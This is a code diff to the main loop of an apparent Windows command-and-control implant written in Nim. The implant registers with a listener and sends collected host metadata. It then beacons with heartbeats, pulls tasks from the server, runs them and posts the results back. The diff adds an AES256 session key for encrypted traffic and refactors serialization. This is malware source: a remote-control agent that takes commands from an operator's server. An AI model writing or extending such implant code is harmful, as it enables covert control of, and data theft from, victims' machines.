@@ -1,8 +1,8 @@
 import strformat, os, times, random
 import winim
 
-import core/[task, taskresult, heartbeat, http, metadata]
-import ../../common/[types, utils]
+import core/[task, taskresult, heartbeat, http, register]
+import ../../common/[types, utils, crypto]
 import sugar
 
 const ListenerUuid {.strdefine.}: string = ""
@@ -40,12 +40,13 @@ proc main() =
         listenerId: ListenerUuid,
         ip: address, 
         port: ListenerPort, 
-        sleep: SleepDelay
+        sleep: SleepDelay,
+        sessionKey: generateSessionKey(),   # Generate a new AES256 session key for encrypted communication
     )
 
     # Create registration payload
-    let registrationData: AgentRegistrationData = config.collectAgentMetadata()
-    let registrationBytes = serializeRegistrationData(registrationData)
+    var registration: AgentRegistrationData = config.collectAgentMetadata()
+    let registrationBytes = config.serializeRegistrationData(registration)
 
     config.register(registrationBytes)
     echo fmt"[+] [{config.agentId}] Agent registered."
@@ -68,16 +69,16 @@ proc main() =
 
         # Retrieve task queue for the current agent by sending a check-in/heartbeat request
         # The check-in request contains the agentId, listenerId, so the server knows which tasks to return
-        let             
-            heartbeat: Heartbeat = config.createHeartbeat()
-            heartbeatData: seq[byte] = serializeHeartbeat(heartbeat)
-            packet: string = config.getTasks(heartbeatData)
+        var heartbeat: Heartbeat = config.createHeartbeat()
+        let 
+            heartbeatBytes: seq[byte] = config.serializeHeartbeat(heartbeat)
+            packet: string = config.getTasks(heartbeatBytes)
 
         if packet.len <= 0: 
             echo "No tasks to execute."
             continue
 
-        let tasks: seq[Task] = deserializePacket(packet)
+        let tasks: seq[Task] = config.deserializePacket(packet)
         
         if tasks.len <= 0: 
             echo "No tasks to execute."
@@ -85,12 +86,10 @@ proc main() =
 
         # Execute all retrieved tasks and return their output to the server
         for task in tasks: 
-            let 
-                result: TaskResult = config.handleTask(task)
-                resultData: seq[byte] = serializeTaskResult(result)
+            var result: TaskResult = config.handleTask(task)
+            let resultBytes: seq[byte] = config.serializeTaskResult(result)
 
-            # echo resultData
-            config.postResults(resultData)
+            config.postResults(resultBytes)
             
 when isMainModule: 
     main() 
